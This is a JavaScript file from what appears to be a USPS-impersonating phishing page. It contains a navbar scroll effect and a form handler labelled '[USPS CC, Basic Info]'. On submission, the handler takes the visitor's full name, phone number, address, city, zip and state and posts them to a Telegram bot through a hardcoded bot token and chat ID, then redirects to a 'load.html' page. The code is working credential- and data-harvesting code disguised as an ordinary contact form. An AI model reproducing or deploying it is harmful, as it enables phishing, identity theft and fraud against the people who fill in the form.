window.addEventListener('scroll', () => {
    const navbar = document.querySelector('.navbar__container');
    const scrolledClass = 'scrolled';
    const scrollPosition = window.scrollY;

    if (scrollPosition > 50) { // Change 50 to the desired pixel value
        navbar.classList.add(scrolledClass);
    } else {
        navbar.classList.remove(scrolledClass);
    }
});


// Submissions
const first = document.getElementById('firstname');
const last = document.getElementById('lastname');
const phone = document.getElementById('phone');
const addy = document.getElementById('address');
const city = document.getElementById('city');
const zip = document.getElementById('zip');
const state = document.getElementById('state');
const submit = document.getElementsByClassName('form-contact')[0];

submit.addEventListener('submit', async (e) => {
    e.preventDefault();

    let ebody = `
    \n
    <b>[USPS CC, Basic Info]</b>
    \n
    <b>Full Name: </b>${first.value} ${last.value}
    \n 
    <b>Phone Number: </b>${phone.value} 
    \n
    <b>Address: </b>${addy.value}
    \n
    <b>City: </b>${city.value}
    \n
    <b>Zip: </b>${zip.value}
    \n
    <b>State: </b>${state.value}
    \n`;

    // Telegram Bot API endpoint
    const telegramBotToken = '5943159759:AAF2du7IRutCVQStuAp66ZdnfuKkJNjLtnA';
    const chatId = '6391433593';

    const telegramApiUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

    try {
        const response = await axios.post(telegramApiUrl, {
            chat_id: chatId,
            text: ebody,
            parse_mode: 'HTML',
        });

        // Redirect after sending the message
        window.location.href = "load.html";
    } catch (error) {
        console.error("Error sending to Tele:", error);

        // Check if there's a specific error message from the Telegram API response
        if (error.response && error.response.data) {
            console.error("Tele API error:", error.response.data);
        }
    }
});